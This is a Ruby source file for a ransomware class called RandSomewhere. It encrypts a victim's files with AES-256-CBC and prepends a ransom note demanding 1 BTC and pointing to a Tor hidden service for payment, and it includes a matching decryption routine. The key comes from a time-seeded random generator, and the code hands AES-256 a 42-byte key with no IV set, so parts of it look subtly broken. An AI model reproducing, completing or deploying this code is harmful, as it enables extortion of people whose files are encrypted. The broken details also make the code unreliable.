require 'openssl'

class RandSomewhere

  def initialize(bitcoin_addr, hidden_service_name, id_num, time)
  	rand = Random.new(seed = time) # Time.now.to_i)
    key_length = 42
    @key = rand.bytes(key_length)
    @algo = "AES-256-CBC"
    @header =  "Encrypted by randsomewhere. Send 1 BTC to bitcoin address #{bitcoin_addr}"
    @header << "Visit Tor hidden service http://#{hidden_service_name}.onion/?id=#{id_num} to confirm your payment and receive the decryption program."
  end

  def encrypt_file(filename)
    cipher = OpenSSL::Cipher.new(@algo)
    cipher.encrypt
    cipher.key = @key
    data = IO.binread(filename)  
    encrypted_data = cipher.update(data)
    encrypted_data << cipher.final
    IO.binwrite(filename + ".encrypted", @header + encrypted_data)
  end

  def decrypt_file(filename)
    cipher = OpenSSL::Cipher.new(@algo)
    cipher.decrypt
    cipher.key = @key
    data = IO.binread(filename)
    file_data = data[@header.length..-1] # Skip the header.
    plaintext = cipher.update(file_data)
    plaintext << cipher.final
    plaintext_filename = filename + ".decrypted"
    IO.binwrite(plaintext_filename, plaintext)
  end

end